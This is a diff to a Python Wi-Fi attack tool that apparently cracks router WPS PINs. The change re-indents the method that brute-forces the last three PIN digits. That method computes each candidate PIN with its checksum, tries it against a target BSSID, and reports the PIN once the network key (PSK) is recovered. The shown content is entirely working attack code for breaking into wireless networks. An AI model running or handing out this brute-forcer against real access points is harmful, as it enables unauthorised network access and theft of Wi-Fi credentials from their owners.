@@ -795,50 +795,50 @@ class Companion:
         return False # Indicate failure to find first half
 
     def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None):
-    """ Brute forces the second 3 digits of the PIN. """
-    checksum = self.generator.checksum
-    # Ensure s_half is an integer for the loop condition
-    current_s_half_int = int(s_half)
-    max_second_half = 999
-
-    while current_s_half_int <= max_second_half:
-        # Format the current s_half back to a 3-digit string for pin generation and status
-        current_s_half_str = str(current_s_half_int).zfill(3)
-        t = int(f_half + current_s_half_str)
-        pin = '{}{}{}'.format(f_half, current_s_half_str, checksum(t))
-        
-        # The mask for the status tracker during the second half should be the full 7-digit combination
-        full_seven_digit_mask = f_half + current_s_half_str
-        
-        # Pass the full 7-digit mask representing the current attempt
-        self.bruteforce.registerAttempt(full_seven_digit_mask)
-        
-        self.single_connection(bssid, pin)
-        
-        # Check if the full PIN was successful (status changed to GOT_PSK)
-        if self.connection_status.status == 'GOT_PSK':
-            print(f'[+] Full WPS PIN found: {pin}')
-            # The main smart_bruteforce loop will detect GOT_PSK and terminate
-            return pin 
-        elif self.connection_status.status == 'WPS_FAIL':
-            print('[!] WPS transaction failed, re-trying last PIN...')
-            # Do not increment, retry the same PIN
-            continue # Explicitly continue the loop without incrementing
-        elif self.connection_status.last_m_message > 6:
-            # Received M7 or higher, implies the PIN was likely correct but maybe PSK fetch failed immediately
-            # Often means the PIN is correct. We'll consider this a success for the PIN part.
-             print(f'[+] PIN appears correct (received M{self.connection_status.last_m_message}), stopping attack. PIN: {pin}')
-             return pin
-        else:
-            # Increment to the next PIN for the next iteration
-            current_s_half_int += 1
-            # registerAttempt has already been called for the *previous* attempt's mask.
-            
-        if delay:
-            time.sleep(delay)
+        """ Brute forces the second 3 digits of the PIN. """
+        checksum = self.generator.checksum
+        # Ensure s_half is an integer for the loop condition
+        current_s_half_int = int(s_half)
+        max_second_half = 999
     
-    print('[-] Second half of the PIN not found (tried 000-999 for the last 3 digits).')
-    return False # Indicate failure to find second half
+        while current_s_half_int <= max_second_half:
+            # Format the current s_half back to a 3-digit string for pin generation and status
+            current_s_half_str = str(current_s_half_int).zfill(3)
+            t = int(f_half + current_s_half_str)
+            pin = '{}{}{}'.format(f_half, current_s_half_str, checksum(t))
+            
+            # The mask for the status tracker during the second half should be the full 7-digit combination
+            full_seven_digit_mask = f_half + current_s_half_str
+            
+            # Pass the full 7-digit mask representing the current attempt
+            self.bruteforce.registerAttempt(full_seven_digit_mask)
+            
+            self.single_connection(bssid, pin)
+            
+            # Check if the full PIN was successful (status changed to GOT_PSK)
+            if self.connection_status.status == 'GOT_PSK':
+                print(f'[+] Full WPS PIN found: {pin}')
+                # The main smart_bruteforce loop will detect GOT_PSK and terminate
+                return pin 
+            elif self.connection_status.status == 'WPS_FAIL':
+                print('[!] WPS transaction failed, re-trying last PIN...')
+                # Do not increment, retry the same PIN
+                continue # Explicitly continue the loop without incrementing
+            elif self.connection_status.last_m_message > 6:
+                # Received M7 or higher, implies the PIN was likely correct but maybe PSK fetch failed immediately
+                # Often means the PIN is correct. We'll consider this a success for the PIN part.
+                 print(f'[+] PIN appears correct (received M{self.connection_status.last_m_message}), stopping attack. PIN: {pin}')
+                 return pin
+            else:
+                # Increment to the next PIN for the next iteration
+                current_s_half_int += 1
+                # registerAttempt has already been called for the *previous* attempt's mask.
+                
+            if delay:
+                time.sleep(delay)
+        
+        print('[-] Second half of the PIN not found (tried 000-999 for the last 3 digits).')
+        return False # Indicate failure to find second half
 
 def smart_bruteforce(self, bssid, start_pin=None, delay=None):
     """
